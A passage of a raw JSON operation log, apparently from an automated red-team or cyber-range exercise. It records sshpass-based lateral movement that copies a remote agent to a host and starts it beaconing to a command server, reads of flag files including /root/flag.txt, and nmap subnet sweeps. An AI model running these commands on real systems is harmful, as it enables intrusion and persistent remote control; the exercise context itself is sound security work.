UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh", "description": "Copy 54ndc47 to remote host and start it, assumes target uses password enabled SSH", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: SSH"}, "agent_reported_time": "2023-10-09T22:23:45Z", "command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux ubuntu@192.168.201.91:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 ubuntu@192.168.201.91 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "facts": [{"trait": "host.ip.address", "links": ["5a0287a7-b2dd-466e-a2df-78ae1c5bbcbd", "1039a3be-ffcd-45cf-9520-515dfa35f050"], "collected_by": ["rkzyad"], "score": 1, "limit_count": -1, "name": "host.ip.address", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.91", "unique": "host.ip.address192.168.201.91", "created": "2023-10-09T22:23:45Z", "relationships": ["[]"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:23:45Z"}, {"deadman": false, "finish": "2023-10-09T22:23:50Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "1039a3be-ffcd-45cf-9520-515dfa35f050", "plaintext_command": "sshpass -p \"ubuntu\" scp -P 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux ubuntu@192.168.201.91:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 ubuntu@192.168.201.91 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "used": [{"trait": "host.lateralMove.password", "links": [], "collected_by": ["rkzyad"], "score": 1, "limit_count": -1, "name": "host.lateralMove.password", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "ubuntu", "unique": "host.lateralMove.passwordubuntu", "created": "2023-10-09T22:23:48Z", "relationships": []}, {"trait": "host.lateralMove.user", "links": [], "collected_by": ["rkzyad"], "score": 1, "limit_count": -1, "name": "host.lateralMove.user", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "ubuntu", "unique": "host.lateralMove.userubuntu", "created": "2023-10-09T22:23:48Z", "relationships": []}, {"trait": "host.lateralMove.ip", "links": [], "collected_by": ["rkzyad"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.91", "unique": "host.lateralMove.ip192.168.201.91", "created": "2023-10-09T22:23:48Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["rkzyad"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "8000", "unique": "host.lateralMove.port8000", "created": "2023-10-09T22:23:48Z", "relationships": []}], "unique": "1039a3be-ffcd-45cf-9520-515dfa35f050", "decide": "2023-10-09T22:23:48Z", "status": 1, "score": 15, "pid": "1193", "relationships": [], "host": "activedir-host", "pin": 0, "paw": "rkzyad", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ssh", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh", "description": "Copy 54ndc47 to remote host and start it, assumes target uses password enabled SSH", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: SSH"}, "agent_reported_time": "2023-10-09T22:23:50Z", "command": "sshpass -p \"ubuntu\" scp -P 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux ubuntu@192.168.201.91:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 ubuntu@192.168.201.91 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "facts": [{"trait": "host.ip.address", "links": ["5a0287a7-b2dd-466e-a2df-78ae1c5bbcbd", "1039a3be-ffcd-45cf-9520-515dfa35f050"], "collected_by": ["rkzyad"], "score": 1, "limit_count": -1, "name": "host.ip.address", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.91", "unique": "host.ip.address192.168.201.91", "created": "2023-10-09T22:23:45Z", "relationships": ["[]"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:23:50Z"}, {"deadman": false, "finish": "2023-10-09T22:23:57Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "ls -l #{host.dir.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.dir.contents", "edge": "has_children", "source": "host.dir.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "0be0e5ae-fa60-43a3-a9d6-f19258a67913", "plaintext_command": "ls -l /home", "used": [{"trait": "host.dir.path", "links": [], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 4, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-09T22:23:53Z", "relationships": []}], "unique": "0be0e5ae-fa60-43a3-a9d6-f19258a67913", "decide": "2023-10-09T22:23:53Z", "status": 0, "score": 1, "pid": "2097", "relationships": [{"target": {"trait": "host.dir.children", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.dir.children", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["database"], "unique": "host.dir.children['database']", "created": "2023-10-09T22:23:57Z", "relationships": []}, "source": {"trait": "host.dir.path", "links": [], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 4, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-09T22:23:53Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_contents", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a362170>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3f7940>", "score": 1}], "host": "database-host", "pin": 0, "paw": "tovvyz", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-ls", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "ls -l #{host.dir.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.dir.contents", "edge": "has_children", "source": "host.dir.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9012", "name": "Enumerate all folders withing a directory", "description": "Enumerates all folders within a directory", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.dir.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.children"}]}], "buckets": ["utility"], "technique_name": "Deception Enum Folders"}, "agent_reported_time": "2023-10-09T22:23:57Z", "command": "ls -l /home", "facts": [{"trait": "host.dir.path", "links": ["fefaaaf8-629b-4c79-b9b1-db6393dba83a", "3da327cd-130e-4252-802a-4b1e6c4aef56", "0be0e5ae-fa60-43a3-a9d6-f19258a67913"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 4, "limit_count": -1, "name": "host.dir.path", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "/home", "unique": "host.dir.path/home", "created": "2023-10-09T22:19:01Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['intern'])", "host.dir.path(/home) : has_contents : host.dir.children(['activedir'])", "host.dir.path(/home) : has_contents : host.dir.children(['database'])"]}, {"trait": "host.dir.children", "links": ["0be0e5ae-fa60-43a3-a9d6-f19258a67913"], "collected_by": ["tovvyz"], "score": 1, "limit_count": -1, "name": "host.dir.children", "technique_id": "T9012", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["database"], "unique": "host.dir.children['database']", "created": "2023-10-09T22:23:57Z", "relationships": ["host.dir.path(/home) : has_contents : host.dir.children(['database'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:23:57Z"}, {"deadman": false, "finish": "2023-10-09T22:24:05Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "5045a296-b4aa-4831-9b56-1fa73916109d", "plaintext_command": "cat /home/database/flag.txt", "used": [{"trait": "host.file.path", "links": ["5045a296-b4aa-4831-9b56-1fa73916109d"], "collected_by": ["tovvyz"], "score": 2, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "/home/database/flag.txt", "unique": "host.file.path/home/database/flag.txt", "created": "2023-10-09T22:23:58Z", "relationships": ["host.file.path(/home/database/flag.txt) : has_contents : host.file.contents(SRVSRGZK1B1OA420MT8T1JTBT9ZPEF9F)"]}], "unique": "5045a296-b4aa-4831-9b56-1fa73916109d", "decide": "2023-10-09T22:23:58Z", "status": 0, "score": 1, "pid": "2099", "relationships": [{"target": {"trait": "host.file.contents", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.file.contents", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "SRVSRGZK1B1OA420MT8T1JTBT9ZPEF9F", "unique": "host.file.contentsSRVSRGZK1B1OA420MT8T1JTBT9ZPEF9F", "created": "2023-10-09T22:24:05Z", "relationships": []}, "source": {"trait": "host.file.path", "links": ["5045a296-b4aa-4831-9b56-1fa73916109d"], "collected_by": ["tovvyz"], "score": 2, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "/home/database/flag.txt", "unique": "host.file.path/home/database/flag.txt", "created": "2023-10-09T22:23:58Z", "relationships": ["host.file.path(/home/database/flag.txt) : has_contents : host.file.contents(SRVSRGZK1B1OA420MT8T1JTBT9ZPEF9F)"]}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_contents", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3efe80>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7fe71a2a5330>", "score": 1}], "host": "database-host", "pin": 0, "paw": "tovvyz", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-readfile", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9000", "name": "Deception read file", "description": "Read a file", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.file.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.file.path", "edge": "has_contents", "target": "host.file.contents"}]}], "buckets": ["utility"], "technique_name": "Deception"}, "agent_reported_time": "2023-10-09T22:24:05Z", "command": "cat /home/database/flag.txt", "facts": [{"trait": "host.file.path", "links": ["5045a296-b4aa-4831-9b56-1fa73916109d"], "collected_by": ["tovvyz"], "score": 2, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "/home/database/flag.txt", "unique": "host.file.path/home/database/flag.txt", "created": "2023-10-09T22:23:58Z", "relationships": ["host.file.path(/home/database/flag.txt) : has_contents : host.file.contents(SRVSRGZK1B1OA420MT8T1JTBT9ZPEF9F)"]}, {"trait": "host.file.contents", "links": ["5045a296-b4aa-4831-9b56-1fa73916109d"], "collected_by": ["tovvyz"], "score": 1, "limit_count": -1, "name": "host.file.contents", "technique_id": "T9000", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "SRVSRGZK1B1OA420MT8T1JTBT9ZPEF9F", "unique": "host.file.contentsSRVSRGZK1B1OA420MT8T1JTBT9ZPEF9F", "created": "2023-10-09T22:24:05Z", "relationships": ["host.file.path(/home/database/flag.txt) : has_contents : host.file.contents(SRVSRGZK1B1OA420MT8T1JTBT9ZPEF9F)"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:24:05Z"}, {"deadman": false, "finish": "2023-10-09T22:24:15Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "75b46932-68c7-4fb3-880a-a08a19de0878", "plaintext_command": "cat /root/flag.txt", "used": [{"trait": "host.file.path", "links": [], "collected_by": ["tubxdc", "tovvyz"], "score": 2, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "/root/flag.txt", "unique": "host.file.path/root/flag.txt", "created": "2023-10-09T22:24:08Z", "relationships": []}], "unique": "75b46932-68c7-4fb3-880a-a08a19de0878", "decide": "2023-10-09T22:24:09Z", "status": 0, "score": 1, "pid": "2106", "relationships": [{"target": {"trait": "host.file.contents", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.file.contents", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "R8KIIFMGSDAKMQD4GB54QCC78LFLGNG5", "unique": "host.file.contentsR8KIIFMGSDAKMQD4GB54QCC78LFLGNG5", "created": "2023-10-09T22:24:15Z", "relationships": []}, "source": {"trait": "host.file.path", "links": [], "collected_by": ["tubxdc", "tovvyz"], "score": 2, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "/root/flag.txt", "unique": "host.file.path/root/flag.txt", "created": "2023-10-09T22:24:08Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_contents", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71acb7340>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7fe71a361f60>", "score": 1}], "host": "database-host", "pin": 0, "paw": "tovvyz", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-readfile", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9000", "name": "Deception read file", "description": "Read a file", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.file.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.file.path", "edge": "has_contents", "target": "host.file.contents"}]}], "buckets": ["utility"], "technique_name": "Deception"}, "agent_reported_time": "2023-10-09T22:24:15Z", "command": "cat /root/flag.txt", "facts": [{"trait": "host.file.path", "links": ["75b46932-68c7-4fb3-880a-a08a19de0878"], "collected_by": ["tubxdc", "tovvyz"], "score": 2, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "/root/flag.txt", "unique": "host.file.path/root/flag.txt", "created": "2023-10-09T22:19:11Z", "relationships": ["host.file.path(/root/flag.txt) : has_contents : host.file.contents(R8KIIFMGSDAKMQD4GB54QCC78LFLGNG5)"]}, {"trait": "host.file.contents", "links": ["75b46932-68c7-4fb3-880a-a08a19de0878"], "collected_by": ["tovvyz"], "score": 1, "limit_count": -1, "name": "host.file.contents", "technique_id": "T9000", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "R8KIIFMGSDAKMQD4GB54QCC78LFLGNG5", "unique": "host.file.contentsR8KIIFMGSDAKMQD4GB54QCC78LFLGNG5", "created": "2023-10-09T22:24:15Z", "relationships": ["host.file.path(/root/flag.txt) : has_contents : host.file.contents(R8KIIFMGSDAKMQD4GB54QCC78LFLGNG5)"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:24:15Z"}, {"deadman": false, "finish": "2023-10-09T22:24:33Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "c902d664-8a84-4ff2-8d31-372b5662c6e5", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "used": [{"trait": "scan.subnet.addr", "links": [], "collected_by": [], "score": 2, "limit_count": -1, "name": "scan.subnet.addr", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.0/24", "unique": "scan.subnet.addr192.168.200.0/24", "created": "2023-10-09T22:24:19Z", "relationships": []}], "unique": "c902d664-8a84-4ff2-8d31-372b5662c6e5", "decide": "2023-10-09T22:24:19Z", "status": 0, "score": 1, "pid": "2109", "relationships": [{"target": {"trait": "host.subnet.online_ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["192.168.200.3", "192.168.200.4", "192.168.200.5", "192.168.200.6", "192.168.200.7", "192.168.200.156"], "unique": "host.subnet.online_ipaddrs['192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.156']", "created": "2023-10-09T22:24:33Z", "relationships": []}, "source": {"trait": "host.subnet.ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.0/24", "unique": "host.subnet.ipaddrs192.168.200.0/24", "created": "2023-10-09T22:24:33Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_online_ipaddrs", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71acb5a50>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3f7460>", "score": 1}], "host": "database-host", "pin": 0, "paw": "tovvyz", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmapsubnet", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-09T22:24:23Z", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "facts": [{"trait": "host.subnet.ipaddrs", "links": ["59b4d7fe-d671-428b-b097-5c860ed68448", "9c43e5e0-30e5-4175-b574-10e29aa9e5c4", "c902d664-8a84-4ff2-8d31-372b5662c6e5"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.0/24", "unique": "host.subnet.ipaddrs192.168.200.0/24", "created": "2023-10-09T22:19:27Z", "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.156', '192.168.200.7'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.156', '192.168.200.3'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.156'])"]}, {"trait": "host.subnet.online_ipaddrs", "links": ["c902d664-8a84-4ff2-8d31-372b5662c6e5"], "collected_by": ["tovvyz"], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["192.168.200.3", "192.168.200.4", "192.168.200.5", "192.168.200.6", "192.168.200.7", "192.168.200.156"], "unique": "host.subnet.online_ipaddrs['192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.156']", "created": "2023-10-09T22:24:33Z", "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.156'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:24:23Z"}, {"deadman": false, "finish": "2023-10-09T22:24:41Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "69651246-38d3-4785-9ca4-b8e1602794d1", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "used": [{"trait": "scan.subnet.addr", "links": [], "collected_by": [], "score": 2, "limit_count": -1, "name": "scan.subnet.addr", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.0/24", "unique": "scan.subnet.addr192.168.201.0/24", "created": "2023-10-09T22:24:34Z", "relationships": []}], "unique": "69651246-38d3-4785-9ca4-b8e1602794d1", "decide": "2023-10-09T22:24:34Z", "status": 0, "score": 1, "pid": "2149", "relationships": [{"target": {"trait": "host.subnet.online_ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["192.168.201.1", "192.168.201.2", "192.168.201.91", "192.168.201.3"], "unique": "host.subnet.online_ipaddrs['192.168.201.1', '192.168.201.2', '192.168.201.91', '192.168.201.3']", "created": "2023-10-09T22:24:41Z", "relationships": []}, "source": {"trait": "host.subnet.ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.0/24", "unique": "host.subnet.ipaddrs192.168.201.0/24", "created": "2023-10-09T22:24:41Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_online_ipaddrs", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3fdc30>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3fecb0>", "score": 1}], "host": "database-host", "pin": 0, "paw": "tovvyz", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmapsubnet", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-09T22:24:39Z", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "facts": [{"trait": "host.subnet.ipaddrs", "links": ["201cc0c4-87d0-40d4-adce-d4b10be0053e", "c8af7bad-aa2d-4cc5-b818-d5a1f0244faa", "69651246-38d3-4785-9ca4-b8e1602794d1"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", 